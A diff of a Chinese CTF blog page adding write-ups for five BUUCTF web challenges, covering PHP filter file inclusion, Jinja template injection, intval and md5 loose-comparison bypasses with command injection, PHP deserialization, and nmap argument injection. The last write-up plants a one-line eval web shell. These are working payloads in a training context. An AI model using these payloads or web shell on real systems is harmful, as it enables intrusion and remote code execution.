@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      6.1k 字
+      7.6k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      91
+      112
        分钟
     </span>
   
@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：5 分钟前
+                  本文最后更新于：几秒前
                 
               </p>
             
@@ -1015,6 +1015,223 @@ post:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-func
 <div class="hljs"><pre><code class="hljs pgsql"><span class="hljs-keyword">get</span>:f=show_image		post:_SESSION[<span class="hljs-keyword">user</span>]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-keyword">function</span>]=a";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:2:"dd";s:1:"a";&#125;</code></pre></div>
 
 
+
+<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>进入题目页面发现页面可以切换，并且url最后的参数也在改变，猜测可能存在文件包含</p>
+<p>利用<code>php://filter</code>读取到index的源码</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$file = $_GET[<span class="hljs-string">'category'</span>];
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($file))&#123;
+	<span class="hljs-keyword">if</span>( strpos( $file, <span class="hljs-string">"woofers"</span> ) !==  <span class="hljs-keyword">false</span> || strpos( $file, <span class="hljs-string">"meowers"</span> ) !==  <span class="hljs-keyword">false</span> || strpos( $file, <span class="hljs-string">"index"</span>))&#123;
+		<span class="hljs-keyword">include</span> ($file . <span class="hljs-string">'.php'</span>);
+	&#125;
+	<span class="hljs-keyword">else</span>&#123;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">"Sorry, we currently only support woofers and meowers."</span>;
+		&#125;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>看上面的代码可以知道提交的文件必须包含 <code>woofers,neowers,index</code>中的一个才行</p>
+<p>猜测flag放在flag.php中，尝试访问，看看有什么回显</p>
+<div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">category</span>=meowers/../flag</code></pre></div>
+
+<p><img src="https://i.loli.net/2020/12/20/fFHTCIk9M5BK4t7.png" srcset="/img/loading.gif" alt="image-20201220231813354"></p>
+<p>源码中出现了之前没有的内容，说明flag.php被包含进来了，那么就想办法读取到flag.php</p>
+<p>想到的方法肯定还是上面堆区index源码的方法</p>
+<p><code>php://filter/read=convert.base64-encode/resource=flag</code></p>
+<p>但是这个没法绕过if语句的判断，所以需要嵌套一个符合的flie</p>
+<p>payload:</p>
+<div class="hljs"><pre><code class="hljs livecodeserver">?category=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/woofers/resource=flag</code></pre></div>
+
+
+
+<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><div class="hljs"><pre><code class="hljs php">import flask
+import os
+
+app = flask.Flask(__name__)
+
+app.config[<span class="hljs-string">'FLAG'</span>] = os.environ.pop(<span class="hljs-string">'FLAG'</span>)
+
+
+@app.route(<span class="hljs-string">'/'</span>)
+def index():
+    <span class="hljs-keyword">return</span> open(<span class="hljs-keyword">__file__</span>).read()
+
+
+@app.route(<span class="hljs-string">'/shrine/&lt;path:shrine&gt;'</span>)
+def shrine(shrine):
+
+    def safe_jinja(s):
+        s = s.replace(<span class="hljs-string">'('</span>, <span class="hljs-string">''</span>).replace(<span class="hljs-string">')'</span>, <span class="hljs-string">''</span>)
+        blacklist = [<span class="hljs-string">'config'</span>, <span class="hljs-string">'self'</span>]
+        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([<span class="hljs-string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="hljs-keyword">for</span> c in blacklist]) + s
+
+    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    app.run(debug=<span class="hljs-keyword">True</span>)</code></pre></div>
+
+<p>可以看到给了两个路由，一个是显示主页内容，一个响应用户请求信息。</p>
+<p>可以看到  <code>jinja</code>,这些都是在模板引擎中有的东西，猜测是SSTi</p>
+<p>访问</p>
+<div class="hljs"><pre><code class="hljs angelscript">/shrine/&#123;&#123;<span class="hljs-number">2</span>*<span class="hljs-number">4</span>&#125;&#125;</code></pre></div>
+
+<p><img src="https://i.loli.net/2020/12/21/C1QdNuAvLGPyhkp.png" srcset="/img/loading.gif" alt="image-20201221081722030"></p>
+<p>页面显示了 2 * 4 的结果，说明就是模板引擎注入。</p>
+<p>继续看源码，首先<code>app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)</code>注册了名为FLAG的config，这个应该就是flag</p>
+<p>但是在 safe_jinja中将config和self加入了黑名单，并且过滤了 ( )，导致我们无法直接使用<code>{{config}}</code>查看</p>
+<p>不过python还有一些内置函数，比如url_for和get_flashed_messages</p>
+<div class="hljs"><pre><code class="hljs awk"><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__&#125;&#125;</code></pre></div>
+
+<p><img src="https://i.loli.net/2020/12/21/MJamurQob4zp5BF.png" srcset="/img/loading.gif" alt="image-20201221082932640"></p>
+<p>current_app意思应该是当前app，那我们就当前app下的config</p>
+<div class="hljs"><pre><code class="hljs awk"><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="hljs-string">'current_app'</span>].config&#125;&#125;</code></pre></div>
+
+<p><img src="https://i.loli.net/2020/12/21/3Z1HNfE9MsXvFAw.png" srcset="/img/loading.gif" alt="image-20201221083018592"></p>
+<p>参考链接：</p>
+<blockquote>
+<p><a href="https://www.cnblogs.com/wangtanzhi/p/12238779.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12238779.html</a></p>
+</blockquote>
+<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>扫描目录看到robots.txt，进去看到了  /fAke_f1agggg.php，访问并在响应头中</p>
+<p><img src="https://i.loli.net/2020/12/22/FB4CfAkSPH6xwXe.png" srcset="/img/loading.gif" alt="image-20201222223155058"></p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">//level 1</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'num'</span>]))&#123;
+    $num = $_GET[<span class="hljs-string">'num'</span>];
+    <span class="hljs-keyword">if</span>(intval($num) &lt; <span class="hljs-number">2020</span> &amp;&amp; intval($num + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>;
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">"金钱解决不了穷人的本质问题"</span>);
+    &#125;
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">"去非洲吧"</span>);
+&#125;
+
+<span class="hljs-comment">//level 2</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'md5'</span>]))&#123;
+   $md5=$_GET[<span class="hljs-string">'md5'</span>];
+   <span class="hljs-keyword">if</span> ($md5==md5($md5))
+       <span class="hljs-keyword">echo</span> <span class="hljs-string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>;
+   <span class="hljs-keyword">else</span>
+       <span class="hljs-keyword">die</span>(<span class="hljs-string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>);
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">"去非洲吧"</span>);
+&#125;
+<span class="hljs-comment">//get flag</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'get_flag'</span>]))&#123;
+    $get_flag = $_GET[<span class="hljs-string">'get_flag'</span>];
+    <span class="hljs-keyword">if</span>(!strstr($get_flag,<span class="hljs-string">" "</span>))&#123;
+        $get_flag = str_ireplace(<span class="hljs-string">"cat"</span>, <span class="hljs-string">"wctf2020"</span>, $get_flag);
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>;
+        system($get_flag);
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">"快到非洲了"</span>);
+    &#125;
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">"去非洲吧"</span>);
+&#125;</code></pre></div>
+
+<p>第一关利用intval处理十六进制字符串的漏洞，当intval(‘0x1’) =0，而intval(‘0x1’+1) = 2</p>
+<p>所以构造payload:</p>
+<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">num</span> = <span class="hljs-number">0</span>x2222</code></pre></div>
+
+<p>第二关使得 $md5==md5($md5)成立，因为使用的是弱比较，所以容易找到这样的字符串，python脚本如下</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(str)</span>:</span>
+    m = hashlib.md5()
+    m.update(str.encode(<span class="hljs-string">"utf8"</span>))
+    <span class="hljs-comment">#print(m.hexdigest())</span>
+    <span class="hljs-keyword">return</span> m.hexdigest()
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">999999999</span>):
+    md = <span class="hljs-string">'0e'</span>
+    md = md + str(i)
+    md1 = md5(md)
+    md1 = str(md1)
+    print(i)
+    <span class="hljs-keyword">if</span> md1[:<span class="hljs-number">2</span>] == <span class="hljs-string">'0e'</span> <span class="hljs-keyword">and</span> md1[<span class="hljs-number">2</span>:].isdigit():
+        print(md)
+        <span class="hljs-keyword">break</span></code></pre></div>
+
+<p>最后找到的字符串是 <code>0e215962017</code>，跑的时间有点长，耐心等待</p>
+<p>第三关，过滤了空格，cat</p>
+<p>可以用<code>$IFS$9</code>和<code>more</code>或者<code>less</code>替换</p>
+<p>先用<code>ls</code>命令查看目录</p>
+<div class="hljs"><pre><code class="hljs angelscript">num=<span class="hljs-number">0x1234</span>&amp;md5=<span class="hljs-number">0e215962017</span>&amp;get_flag=ls</code></pre></div>
+
+<p><img src="https://i.loli.net/2020/12/22/fihPlyegv8AX1NJ.png" srcset="/img/loading.gif" alt="image-20201222232610053"></p>
+<p>读取flag，最后的payload</p>
+<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">num</span>=<span class="hljs-number">0</span>x1234&amp;md5=<span class="hljs-number">0</span>e215962017&amp;get_flag=more<span class="hljs-variable">$IFS</span><span class="hljs-variable">$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span></code></pre></div>
+
+
+
+<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>查看源码可以看到一个time.php，直接给出了源码</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">#error_reporting(0);</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> $a;
+    <span class="hljs-keyword">public</span> $b;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;a = <span class="hljs-string">"Y-m-d h:i:s"</span>;
+        <span class="hljs-keyword">$this</span>-&gt;b = <span class="hljs-string">"date"</span>;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;
+        $a = <span class="hljs-keyword">$this</span>-&gt;a;
+        $b = <span class="hljs-keyword">$this</span>-&gt;b;
+        <span class="hljs-keyword">echo</span> $b($a);
+    &#125;
+&#125;
+$c = <span class="hljs-keyword">new</span> HelloPhp;
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'source'</span>]))
+&#123;
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);
+&#125;
+
+@$ppp = unserialize($_GET[<span class="hljs-string">"data"</span>]);</code></pre></div>
+
+<p>很明显是反序列化</p>
+<p>看到</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;
+    $a = <span class="hljs-keyword">$this</span>-&gt;a;
+    $b = <span class="hljs-keyword">$this</span>-&gt;b;
+    <span class="hljs-keyword">echo</span> $b($a);
+&#125;</code></pre></div>
+
+<p>重点是<code>echo $b($a)</code>,本地测试一下，发现这样是可以的</p>
+<p><img src="https://i.loli.net/2020/12/23/yemNOunQHXx5L71.png" srcset="/img/loading.gif" alt="image-20201223095013236"></p>
+<p>所以就序列化出一个这样的对象然后去读取文件即可</p>
+<div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:"HelloPhp"</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">"ls"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"b"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;&#125;</code></pre></div>
+
+<p>刚开始构造的payload是想着列出目录，但是发现根本列不出目录，所以flag，应该没有放在根目录，于是再尝试读取phpinfo</p>
+<p>使用assert结合phpinfo()，原理如下</p>
+<p><img src="https://i.loli.net/2020/12/23/T8VkhlZmDvyxfU2.png" srcset="/img/loading.gif" alt="image-20201223100638809"></p>
+<p>最后的payload：</p>
+<div class="hljs"><pre><code class="hljs groovy">?data=O:<span class="hljs-number">8</span>:<span class="hljs-string">"HelloPhp"</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;<span class="hljs-string">s:</span><span class="hljs-number">9</span>:<span class="hljs-string">"phpinfo()"</span>;<span class="hljs-string">s:</span><span class="hljs-number">1</span>:<span class="hljs-string">"b"</span>;<span class="hljs-string">s:</span><span class="hljs-number">6</span>:<span class="hljs-string">"assert"</span>;&#125;</code></pre></div>
+
+<p>在phpinfo中搜索flag即可</p>
+<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>进入主页可以看到一个输入IP输入框，尝试输入127.0.0.1</p>
+<p>结果是显示了扫描结果</p>
+<img src="https://i.loli.net/2020/12/23/8It7ZchkmRe9S3B.png" srcset="/img/loading.gif" alt="image-20201223103012938" style="zoom:50%;">
+
+<p>猜测后台的php代码应该是类似这样</p>
+<div class="hljs"><pre><code class="hljs gams"><span class="hljs-keyword">system</span>(<span class="hljs-string">"nmap -sP"</span>.<span class="hljs-symbol">$</span>host);</code></pre></div>
+
+<p>而这里使用 了system函数，所以会存在命令执行，在namp参数中 -oN 可以将扫描结果存放到指定的文件中，所以可以利用这个参数写入一句话木马</p>
+<p><img src="https://i.loli.net/2020/12/23/9qepfWxhil36v7A.png" srcset="/img/loading.gif" alt="image-20201223103811846"></p>
+<p>本地测试一下</p>
+<p><img src="https://i.loli.net/2020/12/23/TMxZQOBmcePn7KD.png" srcset="/img/loading.gif" alt="image-20201223112043439"></p>
+<p>可以看到上面的一句话木马已经写入到了1.php，那么久可以用这个方法做这题</p>
+<p>使用下面的payload</p>
+<p><img src="https://i.loli.net/2020/12/23/LgKxmFEzecqtCwN.png" srcset="/img/loading.gif" alt="image-20201223112236062"></p>
+<p>但是回显了hacker，直接在输入框中输入php，也是回显haceker，所以应该是过滤了php，那就换一个一句话木马</p>
+<div class="hljs"><pre><code class="hljs xml">' -oN b.phtml <span class="php"><span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">eval</span>($_POST[a]);<span class="hljs-meta">?&gt;</span></span>'</code></pre></div>
+
+<p>访问 /b.phtml，发现是可以访问的，所以蚁剑链接，拿到flag</p>
+
             </div>
             <hr>
             <div>
@@ -1031,9 +1248,9 @@ post:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-func
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/md5/">md5</a>
-                    
                       <a class="hover-with-bg" href="/tags/ssrf/">ssrf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/md5/">md5</a>
                     
                       <a class="hover-with-bg" href="/tags/system/">system</a>
                     
@@ -1045,29 +1262,6 @@ post:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="hljs-func
               
                 <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
               
-              
-                <div class="post-prevnext row">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2020/10/08/buuoj-upload/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">buuctf-upload</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2020/10/05/buuoj/">
-                        <span class="hidden-mobile">buuctf-sql注入</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
               
             </div>
 
